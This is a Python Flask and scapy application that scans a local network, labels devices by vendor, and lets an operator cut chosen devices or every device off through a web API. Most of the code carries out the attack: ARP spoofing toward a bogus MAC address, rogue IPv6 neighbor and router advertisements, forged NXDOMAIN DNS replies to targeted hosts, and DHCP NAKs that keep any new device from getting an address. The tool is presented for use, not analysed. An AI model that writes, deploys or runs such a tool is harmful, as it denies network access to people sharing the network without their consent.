import os
import sys
import time
import signal
import threading
import json
import socket
from flask import Flask, render_template, jsonify, request
from scapy.all import ARP, Ether, srp, sendp, send, conf, IP, UDP, sr1, sniff, IPv6, ICMPv6ND_NA, ICMPv6ND_RA, ICMPv6NDOptDstLLAddr, DNS, DNSQR, DNSRR, BOOTP, DHCP
from scapy.layers.netbios import NBNSQueryRequest, NBNSNodeStatusResponse
from scapy.layers.dhcp import *
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# --- Configuration & Storage ---
DB_FILE = "devices.json"

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        except: pass
    return {"devices": {}}

def save_db(db):
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(db, f, indent=4)
    except: pass

# --- Network Configuration Utilities ---

# Expanded OUI to Vendor mapping for brands popular in Pakistan & Global
VENDORS = {
    # Apple
    "00:03:93": "Apple", "00:05:02": "Apple", "00:0A:27": "Apple", "00:0A:95": "Apple",
    "00:11:24": "Apple", "00:14:51": "Apple", "00:16:CB": "Apple", "00:17:F2": "Apple",
    "00:19:E3": "Apple", "B0:D0:63": "Apple", "C0:E1:AC": "Apple", "D0:B3:3F": "Apple",
    # Samsung
    "00:00:F0": "Samsung", "00:07:AB": "Samsung", "00:0D:E5": "Samsung", "00:12:47": "Samsung",
    "00:15:99": "Samsung", "00:16:32": "Samsung", "00:16:DB": "Samsung", "00:17:B9": "Samsung",
    "00:17:C9": "Samsung", "00:18:AF": "Samsung", "00:1B:98": "Samsung", "F4:D4:88": "Samsung",
    # Xiaomi / Redmi
    "00:9E:C1": "Xiaomi", "00:EC:0A": "Xiaomi", "14:F6:5A": "Xiaomi", "18:59:36": "Xiaomi",
    "28:6C:07": "Xiaomi", "34:80:B3": "Xiaomi", "50:64:2B": "Xiaomi", "58:44:98": "Xiaomi",
    "64:09:80": "Xiaomi", "74:51:BA": "Xiaomi", "8C:BE:BE": "Xiaomi", "98:22:EF": "Xiaomi",
    "9C:99:A0": "Xiaomi", "A4:50:46": "Xiaomi", "AC:F7:F3": "Xiaomi", "C4:36:6C": "Xiaomi",
    # Vivo / iQOO
    "00:E5:EE": "Vivo", "04:D1:6E": "Vivo", "0C:71:0D": "Vivo", "28:5D:8E": "Vivo",
    "40:41:A5": "Vivo", "44:F4:59": "Vivo", "4C:F4:5B": "Vivo", "50:5F:F5": "Vivo",
    "5C:62:8B": "Vivo", "6C:F5:C6": "Vivo", "74:05:A5": "Vivo", "84:7B:57": "Vivo",
    "A8:BA:F3": "Vivo", "B0:73:45": "Vivo", "D0:22:BE": "Vivo", "F4:02:28": "Vivo",
    # Oppo / Realme / OnePlus
    "04:CB:88": "Oppo", "10:A8:29": "Oppo", "10:C6:1F": "Oppo", "14:3E:60": "Oppo",
    "1C:53:79": "Oppo", "24:CF:21": "Oppo", "34:E0:CF": "Oppo", "38:97:D1": "Oppo",
    "40:9C:28": "Oppo", "4C:D1:46": "Oppo", "50:8A:06": "Oppo", "58:85:E9": "Oppo",
    "60:21:C0": "Oppo", "64:2F:A0": "Oppo", "70:09:BE": "Oppo", "78:F7:BE": "Oppo",
    "80:EA:CA": "Oppo", "84:53:0C": "Oppo", "8C:E0:41": "Oppo", "94:65:2D": "Oppo",
    "98:02:8B": "Oppo", "A0:91:C8": "Oppo", "A4:D1:8C": "Oppo", "B0:D5:9D": "Oppo",
    "BC:D1:1F": "Oppo", "C0:38:96": "Oppo", "CC:63:F5": "Oppo", "E0:C3:D9": "Oppo",
    "F4:4E:FD": "Oppo", "F8:8C:21": "Oppo", "FC:58:FA": "Oppo",
    # Infinix / Tecno / Itel (Transsion)
    "00:08:22": "Infinix/Transsion", "00:18:AE": "Infinix/Transsion", "00:27:07": "Infinix/Transsion",
    "04:92:26": "Infinix/Transsion", "08:F0:4B": "Infinix/Transsion", "14:2D:21": "Infinix/Transsion",
    "1C:7B:21": "Infinix/Transsion", "24:C6:96": "Infinix/Transsion", "2C:F0:EE": "Infinix/Transsion",
    "30:CF:F0": "Infinix/Transsion", "48:57:02": "Infinix/Transsion", "50:C1:2B": "Infinix/Transsion",
    "68:D2:C2": "Infinix/Transsion", "74:96:B3": "Infinix/Transsion", "84:F0:46": "Infinix/Transsion",
    "9C:13:21": "Infinix/Transsion", "B4:62:93": "Infinix/Transsion", "C4:AB:12": "Infinix/Transsion",
    "D8:CB:8A": "Infinix/Transsion", "E4:8D:12": "Infinix/Transsion", "F0:65:DD": "Infinix/Transsion",
    # Huawei
    "00:18:82": "Huawei", "00:25:9E": "Huawei", "00:E0:FC": "Huawei", "04:F9:38": "Huawei",
    "08:19:A6": "Huawei", "0C:37:DC": "Huawei", "10:1B:54": "Huawei", "10:47:80": "Huawei",
    "10:C6:1F": "Huawei", "14:5B:D1": "Huawei", "18:DE:D7": "Huawei", "1C:1D:67": "Huawei",
    "20:08:ED": "Huawei", "20:2B:C1": "Huawei", "24:09:75": "Huawei", "24:1F:A0": "Huawei",
    # HP (Hewlett-Packard)
    "00:01:E6": "HP", "00:08:02": "HP", "00:0B:CD": "HP", "00:0E:7F": "HP",
    "00:11:0A": "HP", "00:13:21": "HP", "00:16:35": "HP", "00:17:08": "HP",
    "00:18:FE": "HP", "00:19:BB": "HP", "00:1A:4B": "HP", "00:1B:78": "HP",
    "00:1C:C4": "HP", "00:1E:0B": "HP", "00:1F:29": "HP", "00:21:5A": "HP",
    "00:22:64": "HP", "00:23:47": "HP", "00:24:81": "HP", "00:25:B3": "HP",
    "00:26:55": "HP", "04:09:73": "HP", "08:2E:5F": "HP", "0C:C4:7A": "HP",
    # Dell
    "00:06:5B": "Dell", "00:08:74": "Dell", "00:0B:DB": "Dell", "00:0D:56": "Dell",
    "00:0F:1F": "Dell", "00:11:43": "Dell", "00:12:3F": "Dell", "00:13:72": "Dell",
    "00:14:22": "Dell", "00:15:C5": "Dell", "00:16:76": "Dell", "00:18:8B": "Dell",
    "00:19:B9": "Dell", "00:1A:A0": "Dell", "00:1B:21": "Dell", "00:1C:23": "Dell",
    "00:1D:09": "Dell", "00:1E:4F": "Dell", "00:1F:29": "Dell", "00:21:70": "Dell",
    "00:22:19": "Dell", "00:23:AE": "Dell", "00:24:E8": "Dell", "00:25:64": "Dell",
    "00:26:B9": "Dell", "04:7D:7B": "Dell", "0C:D1:08": "Dell", "14:FE:B5": "Dell",
    # Lenovo
    "00:11:FD": "Lenovo", "00:12:FE": "Lenovo", "00:14:DF": "Lenovo", "00:15:58": "Lenovo",
    "00:19:40": "Lenovo", "00:1A:99": "Lenovo", "00:21:CC": "Lenovo", "04:7B:CB": "Lenovo",
    "08:3E:8E": "Lenovo", "0C:54:15": "Lenovo", "10:62:E5": "Lenovo", "20:76:8F": "Lenovo",
    # ASUS
    "00:0C:6E": "ASUSTek", "00:0E:A6": "ASUSTek", "00:11:2F": "ASUSTek", "00:13:D3": "ASUSTek",
    "00:15:F2": "ASUSTek", "00:17:31": "ASUSTek", "00:18:F3": "ASUSTek", "00:1A:92": "ASUSTek",
    "00:1B:FC": "ASUSTek", "00:1D:60": "ASUSTek", "00:1E:8C": "ASUSTek", "00:1F:C6": "ASUSTek",
    "00:22:15": "ASUSTek", "00:23:54": "ASUSTek", "00:24:8C": "ASUSTek", "00:26:18": "ASUSTek",
    "04:92:26": "ASUSTek", "08:60:6E": "ASUSTek", "0C:9D:92": "ASUSTek", "10:7B:44": "ASUSTek",
    # Acer
    "00:01:2E": "Acer", "00:04:20": "Acer", "00:0B:4D": "Acer", "00:1E:33": "Acer",
    "00:1F:16": "Acer", "00:23:7D": "Acer", "00:26:2D": "Acer", "10:14:4F": "Acer",
    # TP-Link
    "00:1D:0F": "TP-Link", "00:21:29": "TP-Link", "00:23:CD": "TP-Link", "00:25:86": "TP-Link",
    "00:27:19": "TP-Link", "14:CC:20": "TP-Link", "18:A6:F7": "TP-Link", "18:D6:C7": "TP-Link",
    "30:B5:C2": "TP-Link", "3C:46:D8": "TP-Link", "40:11:BF": "TP-Link", "40:11:BF": "TP-Link",
    # D-Link
    "00:05:5D": "D-Link", "00:0D:88": "D-Link", "00:0E:A6": "D-Link", "00:0F:3D": "D-Link",
    "00:11:95": "D-Link", "00:30:BD": "D-Link", "04:A1:51": "D-Link", "0C:5D:10": "D-Link",
    # Tenda
    "00:B0:0C": "Tenda", "04:95:E6": "Tenda", "08:40:F3": "Tenda", "50:2B:73": "Tenda",
    "C8:3A:35": "Tenda", "D4:6E:0E": "Tenda", "E8:65:D4": "Tenda", "F4:C3:52": "Tenda",
    # Mercusys
    "50:91:E3": "Mercusys", "60:99:A1": "Mercusys", "A0:8E:15": "Mercusys", "BC:3F:8F": "Mercusys",
    "D4:6E:5E": "Mercusys", "F4:5C:89": "Mercusys",
    # Specifics from user scan
    "EC:75:0C": "Tenda", "F4:6D:3F": "TP-Link", "90:78:B2": "Xiaomi", "60:FF:9E": "TP-Link",
}

class ArpManager:
    def __init__(self):
        self.gateway_ip = self._detect_gateway()
        self.interface = conf.iface
        self.gateway_mac = self._get_mac(self.gateway_ip) if self.gateway_ip else None
        self.active_targets = {} 
        self.bandwidth_stats = {} # {ip: {"bytes": 0, "last_kbps": 0, "last_time": time.time()}}
        self.is_running = True
        self.global_state = False # True = Everyone Cut
        self._init_system()
        
        # Start Sniffing Thread (Bandwidth)
        self.sniff_thread = threading.Thread(target=self._sniff_loop)
        self.sniff_thread.daemon = True
        self.sniff_thread.start()

        # Start DNS Interceptor (Quantum Feature)
        self.dns_thread = threading.Thread(target=self._dns_sniffer)
        self.dns_thread.daemon = True
        self.dns_thread.start()

        # Start DHCP Interceptor (Quantum Feature)
        self.dhcp_thread = threading.Thread(target=self._dhcp_killer)
        self.dhcp_thread.daemon = True
        self.dhcp_thread.start()

    def _init_system(self):
        self._toggle_ip_forwarding(enable=False)

    def _detect_gateway(self):
        try: return conf.route.route("0.0.0.0")[2]
        except: return None

    def _toggle_ip_forwarding(self, enable=False):
        val = "1" if enable else "0"
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(val)
        except: pass

    def _get_mac(self, ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        if ans: return ans[0][1].hwsrc
        return None

    def _sniff_loop(self):
        """Sniff packets to calculate bandwidth per IP"""
        def packet_handler(pkt):
            if pkt.haslayer(IP):
                src = pkt[IP].src
                dst = pkt[IP].dst
                size = len(pkt)
                for ip in [src, dst]:
                    if ip not in self.bandwidth_stats:
                        self.bandwidth_stats[ip] = {"bytes": 0, "last_kbps": 0, "last_time": time.time()}
                    self.bandwidth_stats[ip]["bytes"] += size

        sniff(iface=self.interface, prn=packet_handler, store=0)

    def get_bandwidth(self, ip):
        stats = self.bandwidth_stats.get(ip)
        if not stats: return 0
        
        now = time.time()
        elapsed = now - stats["last_time"]
        if elapsed >= 1.0:
            kbps = (stats["bytes"] * 8) / (elapsed * 1024) # kbps
            stats["last_kbps"] = round(kbps, 2)
            stats["bytes"] = 0
            stats["last_time"] = now
        return stats["last_kbps"]

    def _detect_icon(self, vendor, name):
        name = name.lower()
        vendor = vendor.lower()
        if "apple" in vendor or "iphone" in name or "ipad" in name: return "mobile-alt"
        if "samsung" in vendor or "vivo" in vendor or "oppo" in vendor or "xiaomi" in vendor or "infinix" in vendor: return "mobile-alt"
        if "tv" in name or "smart" in name or "bravia" in name: return "tv"
        if "playstation" in name or "xbox" in name or "nintendo" in name: return "gamepad"
        if "desktop" in name or "pc" in name: return "desktop"
        if "laptop" in name or "hp" in vendor or "dell" in vendor or "lenovo" in vendor: return "laptop"
        return "laptop"

    def _get_hostname(self, ip):
        """Multi-protocol Hostname Discovery (DNS, NBNS, mDNS)"""
        # 1. Reverse DNS
        try: 
            return socket.gethostbyaddr(ip)[0].split('.')[0]
        except: pass

        # 2. NetBIOS (NBNS) - Good for Windows laptops/PCs
        try:
            pkt = IP(dst=ip)/UDP(sport=137, dport=137)/NBNSQueryRequest(QUESTION_NAME="*")
            ans = sr1(pkt, timeout=0.5, verbose=False)
            if ans and ans.haslayer(NBNSNodeStatusResponse):
                return ans.getlayer(NBNSNodeStatusResponse).RR_NAME.decode().strip()
        except: pass

        # 3. Handle default 'Unknown'
        return "Unknown Device"

    def scan(self):
        if not self.gateway_ip: return []
        ip_range = ".".join(self.gateway_ip.split(".")[:-1]) + ".0/24"
        
        # Rapid ARP Scan
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), timeout=2, verbose=False)
        
        db = load_db()["devices"]
        devices = []
        for _, rec in ans:
            ip = rec.psrc
            mac = rec.hwsrc
            if ip == self.gateway_ip: continue
            
            # Lookup Vendor
            oui = mac.upper()[:8]
            vendor = VENDORS.get(oui, "Unknown Vendor")
            
            # If still unknown, check for Randomized MAC pattern
            if vendor == "Unknown Vendor" and oui[1] in '26AE':
                vendor = "Randomized (Private) MAC"
            elif vendor == "Unknown Vendor":
                for prefix, name in VENDORS.items():
                    if oui.startswith(prefix):
                        vendor = name
                        break
            
            # Persistent Data
            saved_info = db.get(mac, {})
            name = saved_info.get("name") or self._get_hostname(ip)
            icon = saved_info.get("icon") or self._detect_icon(vendor, name)
            
            is_attacking = (ip in self.active_targets and self.active_targets[ip]["running"]) or self.global_state
            
            devices.append({
                "ip": ip, "mac": mac, "vendor": vendor, 
                "name": name, "icon": icon,
                "attacking": is_attacking,
                "bandwidth": self.get_bandwidth(ip)
            })
        return devices

    def _spoof_loop(self, ip, mac):
        self._toggle_ip_forwarding(enable=False)
        bogus_mac = "08:00:27:00:00:00" 
        
        pkt_target = Ether(dst=mac)/ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=bogus_mac)
        pkt_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip, hwsrc=bogus_mac)
        
        ipv6_gw = "fe80::1"
        pkt_v6_na = IPv6(dst="ff02::1")/ICMPv6ND_NA(tgt=ipv6_gw, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr=bogus_mac)
        
        # RA Attack: Tells device we are the IPv6 Router (High Priority)
        # We broadcast this to the target to disrupt their RA table
        pkt_v6_ra = IPv6(dst=mac)/ICMPv6ND_RA(chlim=255, M=0, O=0, routerlifetime=1800, prf='High')/ICMPv6NDOptDstLLAddr(lladdr=bogus_mac)

        while self.active_targets.get(ip, {}).get("running", False):
            try:
                sendp(pkt_target, verbose=False)
                sendp(pkt_gateway, verbose=False)
                sendp(pkt_v6_na, verbose=False)
                sendp(pkt_v6_ra, verbose=False) # The Nuclear RA
                time.sleep(0.7)
            except:
                break

    def _dns_sniffer(self):
        """SNIFFS for DNS queries and blocks them for active targets"""
        def process_dns(pkt):
            if not pkt.haslayer(DNS) or pkt[DNS].qr == 0: # Is a query
                target_ip = pkt[IP].src
                if target_ip in self.active_targets:
                    # Send NXDOMAIN (Domain Not Found)
                    resp = IP(dst=target_ip, src=pkt[IP].dst)/\
                           UDP(dport=pkt[UDP].sport, sport=53)/\
                           DNS(id=pkt[DNS].id, qr=1, aa=1, rcode=3, qd=pkt[DNS].qd)
                    send(resp, verbose=False)

        sniff(filter="udp port 53", prn=process_dns, store=0)

    def _dhcp_killer(self):
        """Blocks new devices from getting IP addresses"""
        def process_dhcp(pkt):
            if pkt.haslayer(DHCP):
                msg_type = [x[1] for x in pkt[DHCP].options if x[0] == 'message-type'][0]
                if msg_type in [1, 3]: # DISCOVER or REQUEST
                    target_mac = pkt[Ether].src
                    # Send NAK (Negative Acknowledgment)
                    # This tells the device its requested IP is rejected
                    nak = Ether(dst=target_mac)/IP(src=self.gateway_ip, dst="255.255.255.255")/\
                          UDP(sport=67, dport=68)/BOOTP(op=2, yiaddr="0.0.0.0", siaddr="0.0.0.0", chaddr=pkt[BOOTP].chaddr)/\
                          DHCP(options=[("message-type", "nak"), ("server_id", self.gateway_ip), "end"])
                    sendp(nak, verbose=False)

        sniff(filter="udp port 67 or 68", prn=process_dhcp, store=0)

    def toggle_attack(self, ip, mac, state):
        if state:
            if ip not in self.active_targets:
                self.active_targets[ip] = {"mac": mac, "running": True}
                threading.Thread(target=self._spoof_loop, args=(ip, mac), daemon=True).start()
            else:
                self.active_targets[ip]["running"] = True
        else:
            if ip in self.active_targets:
                self.active_targets[ip]["running"] = False
                self._restore(ip, mac)

    def toggle_all(self, state, devices=None):
        self.global_state = state
        if state and devices:
            for dev in devices:
                self.toggle_attack(dev['ip'], dev['mac'], True)
        elif not state:
            for ip in list(self.active_targets.keys()):
                self.toggle_attack(ip, self.active_targets[ip]['mac'], False)

    def _restore(self, ip, mac):
        pkt_target = Ether(dst=mac)/ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        pkt_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip, hwsrc=mac)
        sendp(pkt_target, count=7, verbose=False)
        sendp(pkt_gateway, count=7, verbose=False)

    def stop_all(self):
        self.is_running = False
        for ip, info in self.active_targets.items():
            self._restore(ip, info["mac"])
        self._toggle_ip_forwarding(enable=True)

manager = ArpManager()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan')
def api_scan():
    try:
        devices = manager.scan()
        return jsonify({"status": "success", "devices": devices})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/toggle', methods=['POST'])
def api_toggle():
    data = request.json
    manager.toggle_attack(data['ip'], data['mac'], data['state'])
    return jsonify({"status": "success"})

@app.route('/api/toggle_all', methods=['POST'])
def api_toggle_all():
    data = request.json
    manager.toggle_all(data['state'], data.get('devices'))
    return jsonify({"status": "success"})

@app.route('/api/nickname', methods=['POST'])
def set_nickname():
    data = request.json # {mac, name, icon}
    db = load_db()
    db["devices"][data['mac']] = {"name": data['name'], "icon": data['icon']}
    save_db(db)
    return jsonify({"status": "success"})

@app.route('/api/status')
def api_status():
    # Only return bandwidth for already discovered devices to minimize scan time
    stats = {ip: manager.get_bandwidth(ip) for ip in manager.bandwidth_stats.keys()}
    return jsonify({"status": "success", "bandwidth": stats, "global_state": manager.global_state})

if __name__ == '__main__':
    if os.getuid() != 0:
        print("[!] Must run as root (sudo)")
        sys.exit(1)
    
    def signal_handler(sig, frame):
        print("\nShutting down and restoring network...")
        manager.stop_all()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    app.run(host='0.0.0.0', port=5000, debug=False)
